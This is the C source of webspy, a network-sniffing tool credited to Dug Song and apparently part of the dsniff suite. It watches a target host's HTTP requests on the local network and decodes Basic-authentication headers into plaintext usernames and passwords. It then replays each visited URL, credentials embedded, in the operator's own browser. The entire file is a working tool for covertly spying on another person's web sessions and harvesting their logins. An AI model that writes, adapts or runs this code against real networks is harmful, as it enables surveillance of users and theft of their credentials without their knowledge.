/*
 * webspy.c
 *
 * Sniff a user's web session, follow it real-time in our browser.
 *
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: webspy.c,v 1.28 2001/03/15 08:33:05 dugsong Exp $
 */

#include "config.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <X11/Xlib.h>
#include <libnet.h>
#include <nids.h>

#include "base64.h"
#include "buf.h"
#include "version.h"

/* for jwz's remote.c. */
extern int mozilla_remote_commands (Display *, Window, char **);
char	*expected_mozilla_version = "4.7";
char	*progname = "webspy";

Display		*dpy;
char		 cmd[2048], *cmdtab[2];
in_addr_t	 host;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: %s [-i interface | -p pcapfile] host\n", progname);
	exit(1);
}

static int
is_display_uri(char *uri)
{
	static char *good_prefixes[] = { NULL };
	static char *good_suffixes[] = { ".html", ".htm", "/", ".shtml",
					 ".cgi", ".asp", ".php3", ".txt",
					 ".xml", ".asc", NULL };
	int len, slen;
	char **pp, *p;
	
	/* Get URI length, without QUERY_INFO */
	if ((p = strchr(uri, '?')) != NULL) {
		len = p - uri;
	}
	else len = strlen(uri);
	
	for (pp = good_suffixes; *pp != NULL; pp++) {
		if (len < (slen = strlen(*pp))) continue;
		if (strncasecmp(&uri[len - slen], *pp, slen) == 0)
			return (1);
	}
	for (pp = good_prefixes; *pp != NULL; pp++) {
		if (len < (slen = strlen(*pp))) continue;
		if (strncasecmp(uri, *pp, slen) == 0)
			return (1);
	}
	return (0);
}

/*
  XXX - we should really be sniffing (and HTML-parsing) the returned
  pages, not just the request URLs. this is why we don't handle
  frames, some CGIs, banner ads, etc. correctly.
*/
static int
process_http_request(struct tuple4 *addr, u_char *data, int len)
{
	struct buf *msg, buf;
	char *p, *req, *uri, *vhost, *auth;
	int i;

	buf_init(&buf, data, len);
	
	while ((i = buf_index(&buf, "\r\n\r\n", 4)) >= 0) {
		msg = buf_tok(&buf, NULL, i);
		msg->base[msg->end] = '\0';
		buf_skip(&buf, 4);

		req = strtok(buf_ptr(msg), "\r\n");

		if (strncmp(req, "GET ", 4) != 0 &&
		    strncmp(req, "POST ", 5) != 0 &&
		    strncmp(req, "CONNECT ", 8) != 0)
			continue;
		
		vhost = auth = NULL;
		uri = strchr(req, ' '); *uri++ = '\0'; strtok(uri, " ");
		
		if (strncmp(uri, "http://", 7) == 0) {
			vhost = uri + 7;
			uri = strchr(vhost, '/');
			memmove(uri + 1, uri, strlen(uri));
		}
		if (!is_display_uri(uri))
			continue;
		
		while ((p = strtok(NULL, "\r\n")) != NULL) {
			if (strncasecmp(p, "Authorization: Basic ", 21) == 0) {
				p += 21;
				i = base64_pton(p, p, strlen(p));
				p[i] = '\0';
				auth = p;
			}
			else if (strncasecmp(p, "Host: ", 6) == 0) {
				vhost = p + 6;
			}
		}
		if (auth == NULL)
			auth = "";
		if (vhost == NULL)
			vhost = libnet_addr2name4(addr->daddr, 0);
		
		snprintf(cmd, sizeof(cmd), "openURL(http://%s%s%s%s)",
			 auth, *auth ? "@" : "", vhost, uri);
		fprintf(stderr, "%s\n", cmd);
		
		mozilla_remote_commands(dpy, 0, cmdtab);
	}
	return (len - buf_len(&buf));
}

static void
sniff_http_client(struct tcp_stream *ts, void **yoda)
{
	int i;
	
	/* Only handle HTTP client traffic. */
	if (ts->addr.saddr != host ||
	    (ts->addr.dest != 80 && ts->addr.dest != 3128 &&
	     ts->addr.dest != 8080))
		return;
	
	switch (ts->nids_state) {
	case NIDS_JUST_EST:
		/* Collect data. */
		ts->server.collect = 1;
		
	case NIDS_DATA:
		if (ts->server.count_new != 0) {
			i = process_http_request(&ts->addr, ts->server.data,
						 ts->server.count -
						 ts->server.offset);
			nids_discard(ts, i);
		}
		break;
		
	default:
		if (ts->server.count != 0) {
			process_http_request(&ts->addr, ts->server.data,
					     ts->server.count -
					     ts->server.offset);
		}
		break;
	}
}

static void
null_syslog(int type, int errnum, struct ip *iph, void *data)
{
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	int c;
	
	while ((c = getopt(argc, argv, "i:p:h?V")) != -1) {
		switch (c) {
		case 'i':
			nids_params.device = optarg;
			break;
		case 'p':
			nids_params.filename = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (argc != 1)
		usage();
	
	cmdtab[0] = cmd;
	cmdtab[1] = NULL;
	
	if ((host = libnet_name2addr4(NULL, argv[0], 1)) == -1)
		errx(1, "unknown host");
	
	if ((dpy = XOpenDisplay(NULL)) == NULL)
		errx(1, "connection to local X server failed!");
	
	nids_params.scan_num_hosts = 0;
	nids_params.syslog = null_syslog;
	
	if (!nids_init())
		errx(1, "%s", nids_errbuf);
	
	nids_register_tcp(sniff_http_client);

        if (nids_params.filename == NULL) {
                warnx("listening on %s", nids_params.device);
        }
        else {
                warnx("using %s", nids_params.filename);
        }


	nids_run();
	
	/* NOTREACHED */
	
	exit(0);
}
